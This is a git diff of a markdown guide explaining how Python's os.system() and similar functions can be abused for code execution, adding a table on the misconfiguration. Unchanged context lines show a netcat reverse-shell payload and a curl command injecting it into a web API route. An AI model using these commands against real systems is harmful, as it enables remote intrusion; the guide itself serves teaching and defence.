@@ -16,7 +16,9 @@ The following Python fucntions() can be abused to execute code, exfiltrate data,
 - Jinja2/Tornado 
 - PyYaml 
 
-os.system()
+| Function | Description | Misconfiguration |
+| :---: | :---: | :---: |
+| os.system() | Python function() that allows the execution of shell commands | If a Web API route accepts user-controlled data that doesn't get escaped and filtered and passes it to os.system(), it will attempt to execute the input received as a shell command, allowing the Web API route paramater to be abused for unintended code execution |
 
 Allows the Python script/program to execute shell commands on the underlying OS. Below is a basic example of how this function() can be used. The function() itself is not evil, but passing unsanitized user input to the function() could be dangerous and lead to code execution. Always ensure to pass data to os.system() that is validated, escaped and required for its intended functionality.
 
@@ -74,6 +76,7 @@ Payload: nc -e /bin/bash 10.10.5.10 9999 | Can be replaced by any other form of 
 ```
 curl -x POST -d "request=nc -e /bin/bash 10.10.5.10 9999" http://10.10.10.10:5000/api
 ```
+Web app breakdown:
 
 | Function | Description | 
 | :---: | :---: | 
